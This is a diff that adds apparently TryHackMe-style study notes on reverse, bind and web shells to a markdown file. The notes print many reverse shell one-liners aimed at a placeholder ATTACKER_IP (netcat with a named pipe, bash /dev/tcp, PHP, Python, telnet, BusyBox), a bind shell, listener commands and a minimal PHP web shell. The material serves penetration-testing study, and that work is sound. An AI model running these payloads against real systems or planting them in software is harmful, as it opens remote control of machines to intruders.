@@ -1528,5 +1528,164 @@ The app forwards request to attacker-controlled `attacker.thm`, leaking API keys
 - CrackStation (hash cracking)
 - SRI docs and JWT libraries (official docs)
 
+# Shells Overview
+
+## Introduction
+Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain. In this room, we'll explore different shells used in offensive security, the differences between them, and their use cases. This knowledge can help enhance penetration testing and exploitation skills and also help us understand how to detect when a remote shell is being used by an attacker within an organization.
+
+## What is a Shell?
+A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.
+
+In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.
+
+- **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
+- **Privilege Escalation**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
+- **Data Exfiltration**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
+- **Persistence and Maintenance Access**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
+- **Post-Exploitation Activities**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
+- **Access Other Systems on the Network**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot. This is also known as *pivoting*.
+
+## Reverse Shell
+A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.
+
+### How Reverse Shells Work
+**Set up a Netcat (nc) Listener**
+
+```bash
+attacker@kali:~$ nc -lvnp 443
+listening on [any] 443 ...
+```
+
+- `-l`: listen for a connection  
+- `-v`: verbose mode  
+- `-n`: no DNS resolution  
+- `-p`: specify port  
+
+Common ports used: 53, 80, 8080, 443, 139, 445 (to blend with legitimate traffic).
+
+### Example Reverse Shell Payload (Pipe Reverse Shell)
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+```
+
+**Explanation:**
+- `rm -f /tmp/f`: remove old pipe if exists  
+- `mkfifo /tmp/f`: create named pipe  
+- `cat /tmp/f`: read input from pipe  
+- `| bash -i 2>&1`: pipe to interactive shell  
+- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: connect to attacker and redirect I/O  
+
+### Attacker Receives the Shell
+```bash
+attacker@kali:~$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
+
+target@tryhackme:~$
+```
+
 ---
-*Notes formatted for GitHub by ChatGPT — ready to commit to a repo.*
+
+## Bind Shell
+A bind shell binds a port on the compromised system and listens for a connection. Once connected, it exposes a shell session to the attacker.
+
+### Example Bind Shell Payload
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+Attacker connects with:
+```bash
+nc -nv TARGET_IP 8080
+```
+
+---
+
+## Tools for Listeners
+
+### Rlwrap
+```bash
+rlwrap nc -lvnp 443
+```
+
+### Ncat
+```bash
+ncat -lvnp 4444
+ncat --ssl -lvnp 4444
+```
+
+### Socat
+```bash
+socat -d -d TCP-LISTEN:443 STDOUT
+```
+
+---
+
+## Shell Payloads
+
+### Bash
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+
+### PHP
+```php
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+```
+
+### Python
+```bash
+export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("bash")'
+```
+
+### Others
+- **Telnet**
+```bash
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+```
+- **AWK**
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42){ ... }}' /dev/null
+```
+- **BusyBox**
+```bash
+busybox nc ATTACKER_IP 443 -e sh
+```
+
+---
+
+## Web Shells
+
+Web shells are scripts uploaded to web servers (PHP, ASP, JSP, CGI). They allow command execution through HTTP requests.
+
+### Example PHP Web Shell
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Access:  
+`http://victim.com/uploads/shell.php?cmd=whoami`
+
+### Popular Web Shells
+- **p0wny-shell** – minimalistic single-file PHP web shell  
+- **b374k shell** – feature-rich PHP web shell with file management  
+- **c99 shell** – robust PHP web shell with extensive functionality  
+
+More: [r57shell.net](https://www.r57shell.net/index.php)
+
+---
+
+## Conclusion
+We learned about **Reverse Shells**, **Bind Shells**, and **Web Shells**—their use in offensive security, detection, and defense.  
+- Reverse Shells: connect back to attacker  
+- Bind Shells: listen for incoming connection  
+- Web Shells: abuse web servers for command execution  
+
+Understanding shells is critical for security professionals to perform penetration testing and defend systems.
+
+---
